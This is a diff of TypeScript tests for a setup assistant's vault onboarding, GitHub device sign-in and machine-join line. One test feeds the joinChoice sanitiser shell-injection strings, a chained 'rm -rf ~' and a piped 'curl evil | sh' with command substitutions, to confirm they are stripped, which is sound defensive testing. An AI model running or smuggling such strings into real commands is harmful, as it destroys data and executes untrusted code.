@@ -29,7 +29,7 @@ vi.mock('./claude-credentials.ts', () => ({ claudeLoggedIn: () => auth.ready }))
 const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'setup-welcome-'))
 process.env.WEEVILS_CONFIG = path.join(dir, 'env')
 process.env.WEEVILS_LANG = 'en'
-const { Setup, greeting, firstRunBrief, joinHost, looksLikeLoginCode } = await import('./setup.ts')
+const { Setup, greeting, firstRunBrief, joinHost, looksLikeLoginCode, joinChoice, vaultLine, githubBrief } = await import('./setup.ts')
 const { withLang } = await import('./i18n.ts')
 const { DATA_DIR } = await import('./config.ts')
 const { Join } = await import('./join.ts')
@@ -42,7 +42,7 @@ const state = (o: Partial<SetupState> & { others?: string[] } = {}): SetupState 
     claude: { installed: true, logged: auth.ready }, codex: { installed: false, logged: false }, github: { installed: true, logged: false },
     voice: { spoken: null, openai: false, https: true }, devil: { plugged: false }, mail: { on: false, authors: 0, pending: [] },
     phone: { devices: 1, push: 0 }, shortcut: false, security: { safe: true, https: true, exposedHttp: false }, quota: [],
-    pkg: 'apt', sudo: 'no', tools: {} as SetupState['tools'], projects: 0, projectNames: [], connector: false,
+    pkg: 'apt', sudo: 'no', tools: {} as SetupState['tools'], projects: 0, projectNames: [], connector: false, vault: { state: 'none', imported: false, without: [], said: [] },
     ...o,
   }) as SetupState
 const both = { claude: true, codex: true }
@@ -91,6 +91,46 @@ describe('what weevboss is told in its first days', () => {
     expect(brief).toContain('`weevils setup ask connector`')
     expect(brief).toContain('never explain how weevils works inside')
     expect(firstRunBrief(state(), false)).toContain('cannot take one from a single line')
+  })
+
+  // docs/spec/07-vault.md: the vault is part of the welcome, and each state has one next step, by talking.
+  it('the vault: none → GitHub by its code then setup; found → the recovery code; on → the summary once', () => {
+    const none = firstRunBrief(state(), true)
+    expect(none).toContain('their conversations kept on their own GitHub (the vault): not yet')
+    expect(none).toContain('`weevils setup github` (posts the code and the link of GitHub in your name), then `weevils weevbook vault setup`, the 24 words once, the history question')
+    // GitHub already signed in: straight to the vault.
+    const logged = firstRunBrief(state({ github: { installed: true, logged: true, login: 'alex' } }), true)
+    expect(logged).not.toContain('weevils setup github')
+    expect(logged).toContain('without being asked: `weevils weevbook vault setup`')
+    const found = firstRunBrief(state({ vault: { state: 'found', repo: 'alex/weevbook-vault', imported: false, without: [], said: [] } }), true)
+    expect(found).toContain('a vault exists on their GitHub, not opened on this machine')
+    expect(found).toContain('ask for their 24-word recovery code here in the chat, then `weevils weevbook vault restore --code "…"`')
+    expect(found).not.toContain('vault setup')
+    const on = (said: string[]) => firstRunBrief(state({ vault: { state: 'on', repo: 'alex/weevbook-vault', imported: true, without: [], said } }), true)
+    expect(on(['code', 'history'])).toContain('(the vault): yes (alex/weevbook-vault)')
+    expect(on(['code', 'history'])).toContain('`weevils weevbook vault summary --json` says the import is done, say the summary sentence once, then `weevils setup mark vault:summary`')
+    expect(on(['code', 'history'])).not.toContain('vault setup')
+    // Said: not again. Then the export, once; then nothing more about it.
+    expect(on(['code', 'history', 'summary'])).not.toContain('vault summary')
+    expect(on(['code', 'history', 'summary'])).toContain('offer once their Claude.ai and ChatGPT export, then `weevils setup mark vault:export`')
+    expect(on(['code', 'history', 'summary', 'export'])).not.toMatch(/vault summary|export/)
+  })
+
+  it('`weevils setup` says where the vault stands, what was said already, and which computers lack it', () => {
+    expect(vaultLine({ state: 'none', imported: false, without: [], said: [] })).toBe('vault: none (weevils setup github when GitHub is not signed in, then weevils weevbook vault setup)')
+    expect(vaultLine({ state: 'found', repo: 'alex/weevbook-vault', imported: false, without: [], said: [] })).toContain('found on their GitHub (alex/weevbook-vault), not opened on this machine')
+    expect(vaultLine({ state: 'on', repo: 'alex/weevbook-vault', imported: true, without: ['desk'], said: ['code', 'history'] })).toBe(
+      'vault: on (alex/weevbook-vault) · this machine\'s history imported yes · recovery code given yes · history question asked yes · summary said no · Claude.ai and ChatGPT export offered no · plugged in without it (their line again fixes it): desk',
+    )
+    // A vault that was set up by hand, before weevboss knew of it: it has nothing to announce.
+    expect(vaultLine({ state: 'on', repo: 'alex/weevbook-vault', imported: true, without: [], said: [] })).toBe('vault: on (alex/weevbook-vault) · set up outside your chat: nothing to say about it unless asked')
+  })
+
+  it('what weevboss is handed once GitHub’s code was typed: the next step for the vault, and that the person wrote nothing', () => {
+    expect(githubBrief('alex', 'none')).toMatch(/^GitHub is signed in on this machine now \(alex\): the user typed the code on github\.com, they did not write this message\./)
+    expect(githubBrief('alex', 'none')).toContain('run `weevils weevbook vault setup` now, give the 24 words it prints once')
+    expect(githubBrief('alex', 'found')).toContain('`weevils weevbook vault restore --code "…"`')
+    expect(githubBrief('', 'on')).not.toContain('vault')
   })
 })
 
@@ -163,6 +203,23 @@ describe('another computer, by talking', () => {
     expect(texts().at(-1)).toBe('laptop is plugged in: I can run agents there now.')
   })
 
+  // docs/spec/07-vault.md, « The history »: a date or a few conversations for the other computer ride on its line.
+  it('the line carries what to bring of that computer’s history: a day, or plain words, and nothing else', async () => {
+    expect(joinChoice({})).toBe('')
+    expect(joinChoice({ since: '2026-10-01' })).toBe(' --since 2026-10-01')
+    expect(joinChoice({ match: 'invoice exporter' })).toBe(" --match 'invoice exporter'")
+    expect(joinChoice({ match: 'l’export des factures, été' })).toBe(" --match 'l export des factures été'")
+    // Nothing a shell would read: quotes, substitutions and separators are dropped; a date that is not one is ignored.
+    expect(joinChoice({ since: '2026-10-01; rm -rf ~', match: "x'; curl evil | sh; '$(id)`id`" })).toBe(" --match 'x curl evil sh id id'")
+    auth.ready = true
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'join-home-'))
+    const join = new Join({ file: path.join(home, 'join.json'), authorizedKeys: path.join(home, '.ssh', 'authorized_keys'), service: '/home/user/.local/bin/weevils-service', remotes: () => '', machineIds: () => ['box'] })
+    const { it: s, texts } = make({ join, sshd: async () => true })
+    await s.ask('machine', undefined, false, { since: '2026-10-01' })
+    expect(texts().at(-1)).toMatch(/`curl -fsSL https:\/\/weevils\.example\.com\/api\/join\.sh \| bash -s [A-Za-z0-9_-]+ --since 2026-10-01`/)
+    expect(s.contextFor()).toContain('bash -s •••• --since 2026-10-01')
+  })
+
   it('only from a public https address; SSH to that name, or to a VPS’s public IP behind a tunnel', () => {
     expect(joinHost(state())).toBe('weevils.example.com')
     const tunnel = { url: 'https://some-words-here.trycloudflare.com', reach: 'public' as const }
@@ -186,6 +243,81 @@ describe('another computer, by talking', () => {
       expect(texts().at(-1)).not.toContain('/api/join.sh')
     }
     expect(fs.existsSync(path.join(home, 'join.json'))).toBe(false)
+  })
+})
+
+describe('GitHub, by talking (the vault needs it once)', () => {
+  // A stand-in for gh: its device sign-in prints the code and the address the way gh 2.x does, waits for the code to
+  // be « typed » (a file), then answers as signed in.
+  function fakeGh() {
+    const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'fake-gh-'))
+    const typed = path.join(bin, 'typed')
+    fs.writeFileSync(path.join(bin, 'gh'), `#!/bin/sh
+case "$1 $2" in
+  "auth login")
+    echo "$*" >"${bin}/login-args"
+    echo "! First copy your one-time code: AB12-CD34" >&2
+    echo "Open this URL to continue in your web browser: https://github.com/login/device" >&2
+    while [ ! -f "${typed}" ]; do sleep 0.05; done
+    [ "$(cat "${typed}")" = ok ] ;;
+  "api user") [ -f "${typed}" ] && echo alex ;;
+  "auth setup-git") touch "${bin}/setup-git" ;;
+  *) exit 1 ;;
+esac
+`, { mode: 0o755 })
+    const before = process.env.PATH
+    process.env.PATH = `${bin}${path.delimiter}${before}`
+    return { bin, typed, restore: () => (process.env.PATH = before) }
+  }
+  const until = async (ok: () => boolean) => {
+    for (let i = 0; i < 100 && !ok(); i++) await new Promise((r) => setTimeout(r, 50))
+    expect(ok()).toBe(true)
+  }
+
+  it('one sentence with the code and the github.com/login/device link; once typed, weevboss is told and carries on', async () => {
+    auth.ready = true
+    const gh = fakeGh()
+    try {
+      const { it: s, handoff, texts } = make()
+      expect(await s.githubDevice()).toBe('posted')
+      expect(texts()).toEqual(['Sign in to your GitHub, just once: open [github.com/login/device](https://github.com/login/device) and type this code: **AB12-CD34** (valid 15 minutes). I’ll carry on as soon as it’s done.'])
+      expect(fs.readFileSync(path.join(gh.bin, 'login-args'), 'utf8').trim()).toBe('auth login --hostname github.com --git-protocol https --web --scopes workflow')
+      // Asked again while it waits: the same sentence, not a second code.
+      expect(await s.githubDevice()).toBe('posted')
+      expect(texts()).toHaveLength(1)
+      expect(handoff).not.toHaveBeenCalled()
+      fs.writeFileSync(gh.typed, 'ok')
+      await until(() => handoff.mock.calls.length === 1)
+      const [said, brief] = handoff.mock.calls[0] as unknown as string[]
+      expect(said).toBe('GitHub is connected.')
+      expect(brief).toContain('GitHub is signed in on this machine now (alex)')
+      expect(brief).toContain('weevils weevbook vault setup')
+      // No button, no command for the person, and the generic « GitHub plugged in » line is not added on top.
+      expect(texts()).toHaveLength(1)
+      expect(texts()[0]).not.toMatch(/\[\[setup:|`/)
+      await until(() => fs.existsSync(path.join(gh.bin, 'setup-git')))
+    } finally {
+      gh.restore()
+    }
+  })
+
+  it('a sign-in that does not finish says so in one sentence; nothing to do when GitHub is already signed in', async () => {
+    auth.ready = true
+    const gh = fakeGh()
+    try {
+      const { it: s, handoff, texts } = make()
+      expect(await s.githubDevice()).toBe('posted')
+      fs.writeFileSync(gh.typed, 'expired')
+      // (« api user » answers now, but gh itself gave up: the code was never accepted.)
+      await until(() => texts().length === 2)
+      expect(texts()[1]).toBe('GitHub didn’t sign in (no answer). Tell me when you want to try again.')
+      expect(handoff).not.toHaveBeenCalled()
+      const done = make({}, state({ github: { installed: true, logged: true, login: 'alex' } }))
+      expect(await done.it.githubDevice()).toBe('signed-in')
+      expect(done.texts()).toHaveLength(2)
+    } finally {
+      gh.restore()
+    }
   })
 })
 
